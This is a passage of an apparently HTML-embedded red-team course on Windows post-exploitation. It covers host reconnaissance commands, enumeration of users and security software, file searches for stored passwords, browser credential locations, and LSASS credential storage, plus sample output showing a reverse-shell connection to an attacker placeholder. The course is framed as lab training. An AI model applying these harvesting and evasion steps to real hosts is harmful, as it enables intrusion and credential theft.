SYSTEM? This dictates what you can do next.</li>\n<li><strong>Understand the host&#39;s role:</strong> Is it a workstation, a server, a domain controller? Is it critical infrastructure?</li>\n<li><strong>Identify potential avenues for Privilege Escalation (PE):</strong> If you&#39;re a low-privileged user, you <em>must</em> find a way to get higher privileges (Administrator/SYSTEM) to do anything significant.</li>\n<li><strong>Identify potential avenues for Lateral Movement (LM):</strong> This host is just one point. Where else can you go from here? What other machines does it connect to? What credentials are on this machine that might work elsewhere?</li>\n<li><strong>Locate valuable data:</strong> Are there sensitive files, configuration settings, or cached credentials lying around?</li>\n<li><strong>Gather intelligence about the environment:</strong> Is this host domain-joined? What domain? Who uses this machine? What software is installed?</li>\n<li><strong>Prepare for Persistence:</strong> How can you ensure you regain access if your current shell dies or the machine reboots? (We&#39;ll touch on this briefly, but persistence is a deeper topic later).</li>\n<li><strong>Maintain Operational Security (OpSec):</strong> How can you do all of this without getting caught? (Crucial, and we&#39;ll weave this throughout).</li>\n</ul>\n<p>Initial reconnaissance is about answering these questions using the resources immediately at your disposal.</p>\n<h3><strong>1.3 Establishing and Maintaining a Stable Foothold (Briefly)</strong></h3>\n<p>As mentioned, we&#39;re assuming initial access is achieved. However, it&#39;s worth noting that a stable connection is paramount. A wobbly shell that dies every few minutes is useless. Red teamers use various tools (like Cobalt Strike, Covenant, Metasploit, Empire, etc.) to manage agents or implants that provide reliable command and control.</p>\n<p>For our lab purposes, you might be using RDP, a simple Netcat shell, or a Metasploit session. Just ensure you have a consistent way to run commands on the target machine.</p>\n<h3><strong>1.4 Essential Windows Command-Line Interface (CMD) and PowerShell Usage for Reconnaissance</strong></h3>\n<p>Windows offers two primary command-line environments:</p>\n<ol>\n<li><strong>CMD (<code>cmd.exe</code>):</strong> The classic command prompt. It&#39;s older, simpler, and command-based. Many fundamental network and system commands are executed here. It&#39;s universally available on all Windows versions.</li>\n<li><strong>PowerShell (<code>powershell.exe</code>):</strong> A more modern, object-oriented scripting environment. It&#39;s significantly more powerful, allows for much deeper interaction with the operating system, WMI, and Active Directory, and is essential for modern Windows offensive operations. It&#39;s standard on Windows 7+ and Server 2008 R2+.</li>\n</ol>\n<p><strong>Why use both?</strong></p>\n<ul>\n<li>CMD commands are sometimes quicker for simple tasks (<code>ipconfig</code>, <code>whoami</code>).</li>\n<li>PowerShell is indispensable for complex queries, automation, and interacting with system objects (<code>Get-Process</code>, <code>Get-Service</code>, WMI queries, AD module).</li>\n<li>Sometimes defenders monitor one more heavily than the other. Using both can sometimes help stay under the radar, or reveal different types of information.</li>\n</ul>\n<p>For this module, we&#39;ll primarily use PowerShell where available, as it provides richer, more structured data, but we&#39;ll cover essential CMD commands too.</p>\n<p><strong>Getting Started in the Lab:</strong></p>\n<p>Assume you have a shell (e.g., a Metasploit session, a Netcat listener catching a reverse shell, or an RDP connection). You&#39;ll interact with the command line through this session.</p>\n<h3><strong>1.5 Gathering System Information</strong></h3>\n<p>First things first, what kind of machine are we on?</p>\n<h4><strong>Using <code>systeminfo</code> (CMD)</strong></h4>\n<p>This command provides a wealth of information about the system configuration.</p>\n<pre><code class=\"language-cmd\">systeminfo\n</code></pre>\n<p><strong>What to look for in the output:</strong></p>\n<ul>\n<li><strong>OS Name:</strong> (e.g., Microsoft Windows 10 Enterprise, Microsoft Windows Server 2019 Standard) - Tells you the operating system.</li>\n<li><strong>OS Version:</strong> (e.g., 10.0.19044 N/A Build 19044) - Specific build number. Useful for identifying known OS vulnerabilities.</li>\n<li><strong>OS Configuration:</strong> (e.g., Member Workstation, Standalone Server, Domain Controller) - <em>Crucial</em>! Tells you if it&#39;s part of a domain and its role.</li>\n<li><strong>Registered Owner/Organization:</strong> Sometimes reveals internal naming conventions.</li>\n<li><strong>Product ID:</strong> Can sometimes indicate the type of license/install.</li>\n<li><strong>Original Install Date:</strong> How old is this system?</li>\n<li><strong>System Boot Time:</strong> How long has it been running? (Might indicate recent reboots/patching).</li>\n<li><strong>System Manufacturer/Model:</strong> Hardware details.</li>\n<li><strong>System Type:</strong> (e.g., x64-based PC) - Architecture (32-bit or 64-bit). Important for payload compatibility.</li>\n<li><strong>Domain:</strong> If domain-joined, shows the domain name. <strong>Very important!</strong></li>\n<li><strong>Logon Server:</strong> The DC that authenticated the current user. Useful AD info.</li>\n<li><strong>Hotfix(s):</strong> Lists installed patches. Can reveal if specific security patches are missing.</li>\n<li><strong>Network Card(s):</strong> Basic info about network interfaces.</li>\n</ul>\n<p><strong>Example Output Snippet:</strong></p>\n<pre><code>Host Name:                 TARGET-PC\nOS Name:                   Microsoft Windows 10 Enterprise\nOS Version:                10.0.19044 N/A Build 19044\nOS Manufacturer:           Microsoft Corporation\nOS Configuration:          Member Workstation\nOS Build Type:             Multiprocessor Free\nRegistered Owner:          User\nRegistered Organization:   LAB\nProduct ID:                00000-00000-00000-AA000\nOriginal Install Date:     7/15/2023, 11:30:00 AM\nSystem Boot Time:          7/15/2023, 2:00:00 PM\nSystem Manufacturer:       VMware, Inc.\nSystem Model:              VMware Virtual Platform\nSystem Type:               x64-based PC\nProcessor(s):              1 Processor(s) Installed.\n                           [01]: Intel64 Family 6 Model 158 Stepping 9 GenuineIntel ~2592 Mhz\nBIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1907100924, 7/10/2019\nWindows Directory:         C:\\WINDOWS\nSystem Directory:          C:\\WINDOWS\\system32\nBoot Device:               \\Device\\HarddiskVolume1\nSystem Locale:             en-us;English (United States)\nInput Locale:              en-us;English (United States)\nTime Zone:                 (UTC-05:00) Eastern Time (US &amp; Canada)\nTotal Physical Memory:     4,095 MB\nAvailable Physical Memory: 2,500 MB\nVirtual Memory: Max Size:  8,191 MB\nVirtual Memory: Available: 6,300 MB\nVirtual Memory: In Use:    1,891 MB\nPage File Location(s):     C:\\pagefile.sys\nDomain:                    LAB.LOCAL\nLogon Server:              \\\\DC01.LAB.LOCAL\nHotfix(s):                 8 Hotfix(s) Installed.\n                           [01]: KB456xxxxx\n                           [02]: KB457xxxxx\n                           ...\nNetwork Card(s):           1 Card(s) Installed.\n                           [01]: Intel(R) 82574L Gigabit Network Connection\n                                 Connection Name: Ethernet0\n                                 DHCP Enabled:    Yes\n                                 IP address(es)\n                                 [01]: 192.168.1.150\n</code></pre>\n<h4><strong>Using Registry Queries</strong></h4>\n<p>The Windows Registry is a central database for configuration. You can extract OS version information directly from here.</p>\n<pre><code class=\"language-cmd\">reg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion&quot; /v ProductName\nreg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion&quot; /v CurrentBuild\nreg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion&quot; /v CurrentMajorVersionNumber\nreg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion&quot; /v CurrentMinorVersionNumber\n</code></pre>\n<p><strong>Explanation:</strong></p>\n<ul>\n<li><code>reg query</code>: The command to query the registry.</li>\n<li><code>&quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion&quot;</code>: The key path containing OS version info.</li>\n<li><code>/v ProductName</code>: Specifies the value name (e.g., &quot;Windows 10 Enterprise&quot;).</li>\n<li><code>/v CurrentBuild</code>: Specifies the build number (e.g., &quot;19044&quot;).</li>\n<li><code>/v CurrentMajorVersionNumber</code>, <code>/v CurrentMinorVersionNumber</code>: More specific version numbers.</li>\n</ul>\n<p><strong>Why use Registry?</strong> It&#39;s another way to get the info, sometimes useful if <code>systeminfo</code> is blocked or for scripting. It also introduces interacting with the registry, which is vital for other post-exploitation tasks (like persistence).</p>\n<h3><strong>1.6 Enumerating Users, Groups, and Sessions</strong></h3>\n<p>Who uses this machine? What are their privileges? Who is currently logged in?</p>\n<h4><strong>Using <code>whoami</code> (CMD)</strong></h4>\n<p>Simple, but essential first step. Tells you the user and domain/hostname you are currently operating as.</p>\n<pre><code class=\"language-cmd\">whoami\n</code></pre>\n<p><strong>Output:</strong></p>\n<pre><code>lab\\user1\n</code></pre>\n<p>or</p>\n<pre><code>target-pc\\administrator\n</code></pre>\n<p>This immediately tells you if you are a local user or a domain user, and your username.</p>\n<h4><strong>Using <code>query user</code> (CMD)</strong></h4>\n<p>Lists users currently logged into the system (primarily via RDP or console session).</p>\n<pre><code class=\"language-cmd\">query user\n</code></pre>\n<p><strong>Output Example:</strong></p>\n<pre><code> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME\n&gt;user1                 rdp-tcp#0           0  Active          3  7/15/2023 2:05 PM\n administrator         console             1  Active         none  7/15/2023 1:55 PM\n</code></pre>\n<p><strong>What to look for:</strong></p>\n<ul>\n<li><strong>USERNAME:</strong> Other users logged in. Are any of them administrators? Domain Admins?</li>\n<li><strong>SESSIONNAME:</strong> Type of session (console, rdp-tcp).</li>\n<li><strong>STATE:</strong> Active, Disconnected. Active sessions might be hijackable later (advanced topic).</li>\n<li><strong>IDLE TIME:</strong> How long has the session been idle?</li>\n</ul>\n<p><strong>Why is this important?</strong> Identifying other active users, especially privileged ones, is a key step for potential credential harvesting or session hijacking (M2, M4).</p>\n<h4><strong>Using <code>net user</code> (CMD)</strong></h4>\n<p>Enumerates local users on the machine.</p>\n<pre><code class=\"language-cmd\">net user\n</code></pre>\n<p><strong>Output Example:</strong></p>\n<pre><code>User accounts for \\\\TARGET-PC\n\n-------------------------------------------------------------------------------\nAdministrator           Guest                   user1\nWDAGUtilityAccount      DefaultAccount\nThe command completed successfully.\n</code></pre>\n<p>To get details about a specific user:</p>\n<pre><code class=\"language-cmd\">net user &lt;username&gt;\n</code></pre>\n<p><strong>Example:</strong></p>\n<pre><code class=\"language-cmd\">net user administrator\n</code></pre>\n<p><strong>Output Snippet (for Administrator user):</strong></p>\n<pre><code>User name                     Administrator\nFull Name\nComment                       Built-in account for administering the computer/domain\n...\nAccount active                Yes\nAccount expires               Never\nPassword last set             7/10/2023 10:00:00 AM\nPassword expires              Never\nPassword changeable           7/10/2023 10:00:00 AM\n...\nLocal Group Memberships       *Administrators\nGlobal Group memberships      *None\n...\n</code></pre>\n<p><strong>What to look for:</strong></p>\n<ul>\n<li>List of users: Identify potential targets.</li>\n<li>Details of specific users: When was the password last set? Is the account active? What groups do they belong to? (Local Group Memberships is key here).</li>\n</ul>\n<p><strong>Why is this important?</strong> You need to know which accounts exist locally. Identifying local administrators is critical for privilege escalation.</p>\n<h4><strong>Using <code>net localgroup</code> (CMD)</strong></h4>\n<p>Enumerates local groups and their members.</p>\n<pre><code class=\"language-cmd\">net localgroup\n</code></pre>\n<p><strong>Output Example:</strong></p>\n<pre><code>Aliases for \\\\TARGET-PC\n\n-------------------------------------------------------------------------------\n*Administrators\n*Backup Operators\n*Guests\n*Remote Desktop Users\n*Users\n...\nThe command completed successfully.\n</code></pre>\n<p>To see members of a specific group (most importantly, <code>Administrators</code>):</p>\n<pre><code class=\"language-cmd\">net localgroup administrators\n</code></pre>\n<p><strong>Output Example:</strong></p>\n<pre><code>Alias name     Administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\nLAB\\Domain Admins\nuser1\nThe command completed successfully.\n</code></pre>\n<p><strong>What to look for:</strong></p>\n<ul>\n<li>Which accounts are members of the <code>Administrators</code> group? This is your primary target for local privilege escalation.</li>\n<li>Which accounts are in <code>Remote Desktop Users</code>? They can RDP in.</li>\n<li>Other interesting groups like <code>Backup Operators</code> (can read many files), <code>Remote Management Users</code>, etc.</li>\n</ul>\n<p><strong>Why is this important?</strong> Explicitly identifies which users or groups have administrative privileges on this specific machine. Knowing <code>LAB\\Domain Admins</code> is a member of the local <code>Administrators</code> group on this workstation is a <em>huge</em> finding for lateral movement towards domain dominance.</p>\n<h4><strong>Using PowerShell for Users and Groups (More Detail)</strong></h4>\n<p>PowerShell cmdlets often provide more structured and detailed output.</p>\n<pre><code class=\"language-powershell\">Get-LocalUser\nGet-LocalGroup\nGet-LocalGroupMember -Group &quot;Administrators&quot;\n</code></pre>\n<p>These cmdlets are available on newer Windows versions (Windows 10, Server 2016+). For older versions or domain users/groups (which we&#39;ll cover in Module 5), you&#39;d use WMI or the ActiveDirectory module.</p>\n<p><strong>Example using <code>Get-LocalGroupMember</code>:</strong></p>\n<pre><code class=\"language-powershell\">Get-LocalGroupMember -Group &quot;Administrators&quot; | Select-Object Name, PrincipalSource\n</code></pre>\n<p><strong>Output Example:</strong></p>\n<pre><code>Name                 PrincipalSource\n----                 ---------------\nTARGET-PC\\Administrator Local\nLAB\\Domain Admins    ActiveDirectory\nTARGET-PC\\user1      Local\n</code></pre>\n<p><strong>Why use PowerShell?</strong> The output is object-based, making it much easier to filter, sort, and export data for scripting and automation. <code>PrincipalSource</code> clearly tells you if the member is a local account or a domain account.</p>\n<h3><strong>1.7 Identifying Running Processes and Services</strong></h3>\n<p>What software is running? Are there any security products? Any unusual processes?</p>\n<h4><strong>Using <code>tasklist</code> (CMD)</strong></h4>\n<p>Lists currently running processes.</p>\n<pre><code class=\"language-cmd\">tasklist\n</code></pre>\n<p><strong>Output Snippet:</strong></p>\n<pre><code>Image Name                     PID Session Name        Session#    Mem Usage\n========================= ======== ================ =========== ============\nSystem Idle Process              0 Services                   0         8 KB\nSystem                           4 Services                   0       184 KB\n...\nmsmpeng.exe                   1234 Services                   0     150,000 KB  &lt;-- Windows Defender\nSearchIndexer.exe             5678 Services                   0      50,000 KB\n...\ncmd.exe                       9876 rdp-tcp#0                  0       3,000 KB  &lt;-- Your command prompt!\npowershell.exe               10112 rdp-tcp#0                  0     100,000 KB\n...\n</code></pre>\n<p>To see services hosted within processes:</p>\n<pre><code class=\"language-cmd\">tasklist /svc\n</code></pre>\n<p>To see process details including the full path:</p>\n<pre><code class=\"language-cmd\">tasklist /v\n</code></pre>\n<p><strong>What to look for:</strong></p>\n<ul>\n<li><strong>Security Software:</strong> Processes like <code>msmpeng.exe</code> (Windows Defender), <code>sophos*.exe</code>, <code>McAfee*.exe</code>, <code>agent.exe</code> (endpoint agents). Knowing what security is running helps plan evasion.</li>\n<li><strong>Unusual Processes:</strong> Anything with a strange name, running from a weird directory (<code>C:\\Users\\Public\\temp\\malware.exe</code>), or consuming excessive resources.</li>\n<li><strong>Processes running as SYSTEM:</strong> These are high-privilege processes.</li>\n<li><strong>Processes with network connections:</strong> Cross-reference with <code>netstat</code> output.</li>\n</ul>\n<p><strong>Why is this important?</strong> Helps identify security controls, potential targets for injection or manipulation, and reveals what the user or system is actively doing.</p>\n<h4><strong>Using <code>Get-Process</code> (PowerShell)</strong></h4>\n<p>Provides more detailed information about processes.</p>\n<pre><code class=\"language-powershell\">Get-Process\n</code></pre>\n<p><strong>Example:</strong> Get details for a specific process name:</p>\n<pre><code class=\"language-powershell\">Get-Process -Name &quot;explorer&quot;\n</code></pre>\n<p><strong>Example:</strong> Get processes owned by a specific user (requires admin privileges usually):</p>\n<pre><code class=\"language-powershell\">Get-Process | Where-Object { $_.Owner -eq &quot;LAB\\user1&quot; }\n</code></pre>\n<p><strong>Example:</strong> Get processes and their full path:</p>\n<pre><code class=\"language-powershell\">Get-Process | Select-Object ProcessName, Path\n</code></pre>\n<p><strong>Why use PowerShell?</strong> Object-based output allows for powerful filtering and analysis. You can easily find processes based on owner, path, CPU usage, etc.</p>\n<h4><strong>Using <code>Get-Service</code> (PowerShell)</strong></h4>\n<p>Lists installed services and their status.</p>\n<pre><code class=\"language-powershell\">Get-Service\n</code></pre>\n<p><strong>Example:</strong> List only running services:</p>\n<pre><code class=\"language-powershell\">Get-Service | Where-Object { $_.Status -eq &quot;Running&quot; }\n</code></pre>\n<p><strong>Example:</strong> Get details for a specific service:</p>\n<pre><code class=\"language-powershell\">Get-Service -Name &quot;Spooler&quot; # The Print Spooler service, often targeted\n</code></pre>\n<p><strong>What to look for:</strong></p>\n<ul>\n<li><strong>Running Services:</strong> What functionality is enabled?</li>\n<li><strong>Disabled Services:</strong> Are any critical security services disabled?</li>\n<li><strong>Services running as SYSTEM or specific users:</strong> Potential targets for privilege escalation if misconfigured (covered in M3).</li>\n<li><strong>Unusual Service Names:</strong> Could indicate malware or custom applications.</li>\n</ul>\n<p><strong>Why is this important?</strong> Services are often long-running processes that start at boot. Misconfigured services are a classic privilege escalation vector. Identifying security services helps understand defenses.</p>\n<h3><strong>1.8 Mapping Network Connections and Configuration</strong></h3>\n<p>How is this machine connected? What other machines is it talking to?</p>\n<h4><strong>Using <code>ipconfig</code> (CMD)</strong></h4>\n<p>Displays current TCP/IP network configuration values.</p>\n<pre><code class=\"language-cmd\">ipconfig /all\n</code></pre>\n<p><strong>Output Snippet:</strong></p>\n<pre><code>Windows IP Configuration\n\n   Host Name . . . . . . . . . . . . : TARGET-PC\n   Primary Dns Suffix  . . . . . . . : lab.local\n   Node Type . . . . . . . . . . . . : Hybrid\n   IP Routing Enabled. . . . . . . . : No\n   WINS Proxy Enabled. . . . . . . . : No\n   DNS Suffix Search List. . . . . . : lab.local\n\nEthernet adapter Ethernet0:\n\n   Connection-specific DNS Suffix  . :\n   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection\n   Physical Address. . . . . . . . . : 00-50-56-XX-YY-ZZ\n   DHCP Enabled. . . . . . . . . . . : Yes\n   Autoconfiguration Enabled . . . . : Yes\n   IPv4 Address. . . . . . . . . . . : 192.168.1.150(Preferred)\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Lease Obtained. . . . . . . . . . : Monday, July 15, 2023 2:00:00 PM\n   Lease Expires . . . . . . . . . . : Tuesday, July 16, 2023 2:00:00 PM\n   Default Gateway . . . . . . . . . : 192.168.1.1\n   DHCP Server . . . . . . . . . . . : 192.168.1.1\n   DNS Servers . . . . . . . . . . . : 192.168.1.10  &lt;-- Often the Domain Controller!\n                                       8.8.8.8\n   NetBIOS over Tcpip. . . . . . . . : Enabled\n</code></pre>\n<p><strong>What to look for:</strong></p>\n<ul>\n<li><strong>IP Address(es):</strong> What network segment are you on? Can you reach other segments?</li>\n<li><strong>Subnet Mask:</strong> Helps define the local network.</li>\n<li><strong>Default Gateway:</strong> The router. Often the first hop to other networks.</li>\n<li><strong>DNS Servers:</strong> <strong>Crucial!</strong> In a domain, the primary DNS server is almost always a Domain Controller. This immediately tells you the IP address of a DC.</li>\n<li><strong>Domain Name:</strong> Confirms the domain from <code>systeminfo</code>.</li>\n</ul>\n<p><strong>Why is this important?</strong> Understanding the network configuration is fundamental for planning lateral movement. Identifying the DC via DNS server listing is a primary way to locate domain infrastructure.</p>\n<h4><strong>Using <code>netstat</code> (CMD)</strong></h4>\n<p>Displays active TCP connections, ports on which the computer is listening, Ethernet statistics, the IP routing table, and IPv6 statistics.</p>\n<pre><code class=\"language-cmd\">netstat -ano\n</code></pre>\n<p><strong>Explanation of flags:</strong></p>\n<ul>\n<li><code>-a</code>: Displays all active TCP connections and the TCP and UDP ports on which the computer is listening.</li>\n<li><code>-n</code>: Displays active TCP connections, however, addresses and port numbers are expressed numerically and no attempt is made to determine names. Much faster.</li>\n<li><code>-o</code>: Displays active TCP connections and includes the process ID (PID) for each connection. This is <em>very</em> useful.</li>\n</ul>\n<p><strong>Output Snippet:</strong></p>\n<pre><code>Active Connections\n\n  Proto  Local Address          Foreign Address        State           PID\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       848   &lt;-- RPC Endpoint Mapper\n  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4     &lt;-- SMB (File Sharing)\n  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1236  &lt;-- RDP\n  TCP    192.168.1.150:49870    192.168.1.1:53         ESTABLISHED     1152  &lt;-- DNS query to gateway/DC\n  TCP    192.168.1.150:49871    192.168.1.10:389       ESTABLISHED     9988  &lt;-- LDAP query to DC (192.168.1.10)\n  TCP    192.168.1.150:49872    192.168.1.200:445      ESTABLISHED     4     &lt;-- SMB connection to another host (192.168.1.200)\n  TCP    192.168.1.150:50000    YOUR_ATTACKER_IP:4444\n</code></pre>\n\n                </div>\n             </div>\n         ",
    "module-2": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 2: module_2</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright, team! Welcome back to the deep dive. Module 1 got our feet wet, establishing a basic foothold and getting our bearings on a target Windows host using native tools. We learned <em>how</em> to look around.</p>\n<p>Now, in Module 2, we shift gears. We&#39;re not just looking around passively anymore; we&#39;re actively searching for the <em>good stuff</em>. This means digging deeper into the local system to find valuable information, uncovering potential weaknesses we might exploit later (hello, Module 3!), and, perhaps most importantly, finding those precious credentials that can unlock doors to other systems or higher privileges.</p>\n<p>This is where the post-exploitation phase really starts to pay dividends. Local enumeration gives us context and potential attack vectors, and credential harvesting often provides the keys to the kingdom, or at least the keys to the next room.</p>\n<p>Let&#39;s get our hands dirty!</p>\n<hr>\n<p><strong>Module 2: Local Enumeration &amp; Credential Harvesting</strong></p>\n<p><strong>Module Objective:</strong> Identify valuable local information, uncover potential weaknesses, and extract cached or stored credentials from a compromised Windows host.</p>\n<p>By the end of this module, you will be able to systematically enumerate a Windows host for sensitive files, installed software, system configurations, and critical credential storage locations. You will understand the <em>why</em> behind targeting LSASS and registry hives, and perform practical steps (in a lab!) to extract credentials, setting the stage for privilege escalation and lateral movement.</p>\n<hr>\n<h3><strong>2.1: The Post-Exploitation Mindset: Digging Deeper</strong></h3>\n<p>In Module 1, we were like tourists getting off the plane ‚Äì looking at the major landmarks (<code>systeminfo</code>, <code>ipconfig</code>, <code>net user</code>). Now, we&#39;re residents exploring the hidden alleys, checking basements, and looking under floorboards.</p>\n<p>Our goals in this deeper phase are:</p>\n<ol>\n<li><strong>Gain Context:</strong> Understand the <em>specific</em> role of this machine. Is it a user workstation? A server? What applications run here? Who uses it?</li>\n<li><strong>Find Local Weaknesses:</strong> Identify misconfigurations or vulnerabilities unique to <em>this</em> host that could allow us to elevate privileges locally (more on this in M3).</li>\n<li><strong>Discover Sensitive Data:</strong> Locate files containing passwords, API keys, configuration strings, sensitive documents, etc.</li>\n<li><strong>Harvest Credentials:</strong> Extract cached passwords, hashes, or Kerberos tickets stored in memory or on disk. <strong>This is often the fastest way to move forward.</strong></li>\n</ol>\n<p>We&#39;ll still rely heavily on our command-line friends (CMD and PowerShell), but we&#39;ll also introduce the <em>types</em> of specialized tools used by red teamers and attackers (and defenders!) to automate and facilitate these tasks.</p>\n<h3><strong>2.2: In-Depth Local File System Enumeration</strong></h3>\n<p>The file system is a treasure trove. Users save things where they shouldn&#39;t, applications store configurations insecurely, and scripts might contain hardcoded credentials. Our job is to search intelligently.</p>\n<p><strong>Why Search the File System?</strong></p>\n<ul>\n<li><strong>Configuration Files:</strong> Applications (databases, web servers, custom tools) often store connection strings, API keys, or passwords in XML, INI, CONFIG, or TXT files.</li>\n<li><strong>Scripts:</strong> PowerShell (.ps1), Batch (.bat, .cmd), Python (.py), etc., scripts might contain hardcoded credentials for automation purposes.</li>\n<li><strong>User Profiles:</strong> Desktop, Documents, Downloads, AppData directories often contain cached files, browser history, saved RDP connection files, password manager databases (though hopefully encrypted!), and other sensitive user data.</li>\n<li><strong>Application Data:</strong> Specific application folders (e.g., <code>C:\\Program Files</code>, <code>C:\\Program Files (x86)</code>) might contain configuration files or logs of interest.</li>\n<li><strong>Temporary Directories:</strong> Sometimes sensitive data or temporary credential files are left behind in <code>%TEMP%</code>.</li>\n</ul>\n<p><strong>Techniques &amp; Commands:</strong></p>\n<p>We&#39;ll primarily use PowerShell for its power and flexibility in navigating and searching the file system.</p>\n<ul>\n<li><p><strong>Basic Directory Listing (Recurse):</strong></p>\n<pre><code class=\"language-powershell\">Get-ChildItem -Path C:\\Users -Recurse -ErrorAction SilentlyContinue\n</code></pre>\n<ul>\n<li><code>Get-ChildItem</code>: Equivalent of <code>dir</code>.</li>\n<li><code>-Path C:\\Users</code>: Specifies where to start. User profiles are critical.</li>\n<li><code>-Recurse</code>: Goes into subdirectories. Be aware this can be <em>very</em> slow and generate a lot of output on large file systems.</li>\n<li><code>-ErrorAction SilentlyContinue</code>: Suppresses errors for paths we don&#39;t have permission to access, keeping the output clean.</li>\n</ul>\n</li>\n<li><p><strong>Searching for Specific File Extensions:</strong> We can filter the recursive listing for files that commonly store credentials or configuration.</p>\n<pre><code class=\"language-powershell\">Get-ChildItem -Path C:\\ -Recurse -Include *.config,*.xml,*.ini,*.txt,*.ps1,*.bat,*.cmd,*.py,*.kdbx,*.rdp -ErrorAction SilentlyContinue\n</code></pre>\n<ul>\n<li><code>-Include</code>: Specifies file patterns to include. Note: <code>-Include</code> <em>requires</em> <code>-Recurse</code> and a wildcard (<code>*</code>) in the <code>-Path</code> if searching the root, but the above is a common way to use it starting from a specific path like <code>C:\\</code>. A simpler way is to specify the path more broadly if needed, but the above is generally effective.</li>\n</ul>\n</li>\n<li><p><strong>Searching File Contents (Grepping):</strong> Once we find interesting files, or even across many files, we can search their <em>contents</em> for keywords. PowerShell&#39;s <code>Select-String</code> is powerful for this.</p>\n<pre><code class=\"language-powershell\"># Example 1: Search all .txt files in C:\\ for the word &quot;password&quot;\nGet-ChildItem -Path C:\\ -Recurse -Filter &quot;*.txt&quot; -ErrorAction SilentlyContinue | Select-String &quot;password&quot;\n\n# Example 2: Search specific config files found earlier for &quot;credential&quot; or &quot;pass&quot; (case-insensitive)\nGet-ChildItem -Path C:\\Users\\SpecificUser\\AppData\\Roaming\\MyApp\\config.xml, C:\\Program Files\\AnotherApp\\settings.ini | Select-String -Pattern &quot;credential&quot;, &quot;pass&quot; -IgnoreCase\n</code></pre>\n<ul>\n<li><code>Select-String</code>: Searches for text within files.</li>\n<li><code>-Pattern</code>: The keyword(s) to search for.</li>\n<li><code>-IgnoreCase</code>: Makes the search case-insensitive.</li>\n</ul>\n</li>\n<li><p><strong>Looking for RDP Files:</strong> Users often save RDP connection files with credentials.</p>\n<pre><code class=\"language-powershell\">Get-ChildItem -Path C:\\Users -Recurse -Include *.rdp -ErrorAction SilentlyContinue\n</code></pre>\n<p>If found, open the <code>.rdp</code> file in a text editor; sometimes credentials (or at least the username) are saved within them.</p>\n</li>\n<li><p><strong>Browser History/Saved Passwords:</strong> While direct extraction from running browsers is tricky and depends heavily on the browser version and security, knowing <em>where</em> browser profiles are stored is useful. Tools often target these locations.</p>\n<ul>\n<li>Chrome: <code>%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\</code></li>\n<li>Firefox: <code>%APPDATA%\\Mozilla\\Firefox\\Profiles\\</code></li>\n<li>Edge (Chromium): <code>%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\</code></li>\n</ul>\n</li>\n</ul>\n<p><strong>Practical Tip:</strong> Start broad (<code>Get-ChildItem -Recurse</code>), then filter (<code>-Include</code>), then search contents (<code>Select-String</code>). Be mindful of the potential volume of data. Target user profile directories first as they are most likely to contain user-specific sensitive data.</p>\n<h3><strong>2.3: Enumerating Installed Software and Patches</strong></h3>\n<p>Knowing what software is installed helps identify potential vulnerabilities, interesting applications (like password managers, VPN clients, admin tools), and missing security patches.</p>\n<p><strong>Why Enumerate Software/Patches?</strong></p>\n<ul>\n<li><strong>Vulnerability Identification:</strong> Older versions of software might have known public exploits (CVEs).</li>\n<li><strong>Finding Useful Tools:</strong> Discover applications that might contain credentials (e.g., Putty, WinSCP configuration files), or admin tools that could be leveraged.</li>\n<li><strong>Patch Level Assessment:</strong> Missing security patches can indicate system vulnerability, potentially to kernel exploits or other system-level attacks (Module 3!).</li>\n</ul>\n<p><strong>Techniques &amp; Commands:</strong></p>\n<ul>\n<li><p><strong>Using WMIC (Classic but can be slow):</strong></p>\n<pre><code class=\"language-cmd\">wmic product get name,version\n</code></pre>\n<ul>\n<li>This queries the Windows Installer provider. It&#39;s often slow and can sometimes even trigger re-configuration of installed software. Use with caution.</li>\n</ul>\n</li>\n<li><p><strong>Using PowerShell (More Recommended):</strong></p>\n<pre><code class=\"language-powershell\"># Get list of installed applications (generally faster than WMIC)\nGet-Package\n\n# Get list of installed Hotfixes/Patches\nGet-HotFix\n</code></pre>\n<ul>\n<li><code>Get-Package</code>: Works well on newer Windows versions (Windows 8/Server 2012 R2 and later). Provides name, version, and source.</li>\n<li><code>Get-HotFix</code>: Lists installed Windows updates/patches. Compare this list against known critical security updates to identify missing patches.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Practical Tip:</strong> Combine <code>Get-Package</code> and <code>Get-HotFix</code> output with vulnerability databases (like NVD) or security tools (though this course focuses on offensive techniques, awareness of defensive tools helps understand detection) to identify potential software-based attack vectors.</p>\n<h3><strong>2.4: Understanding Windows Credential Storage Locations</strong></h3>\n<p>This is the core of credential harvesting. Windows needs to store and manage credentials for users to log in, access resources, and run services. Understanding <em>where</em> it stores them is key to knowing <em>how</em> to steal them.</p>\n<p>Think of Windows as having several &quot;vaults&quot; for credentials:</p>\n<ol>\n<li><p><strong>LSASS (Local Security Authority Subsystem Service):</strong></p>\n<ul>\n<li>This is a critical Windows process (<code>lsass.exe</code>).</li>\n<li>It handles security policy, user authentication, and manages credentials for currently logged-on users and active system processes.</li>\n<li>It holds various credential representations in memory:<ul>\n<li><strong>Cleartext Passwords:</strong> Sometimes, if certain security policies are enabled or on older systems. <em>Highly valuable!</em></li>\n<li><strong>NTLM Hashes:</strong> Cryptographic hashes of user passwords (specifically, the NTLM hash).</li>\n<li><strong>Kerberos Tickets:</strong> Both Ticket Granting Tickets (TGTs) and Service Tickets (TGSs). These can be reused (Pass-the-Ticket).</li>\n<li><strong>LSA Secrets:</strong> System-level credentials used by services or the machine account.</li>\n</ul>\n</li>\n<li>Accessing LSASS memory requires high privileges 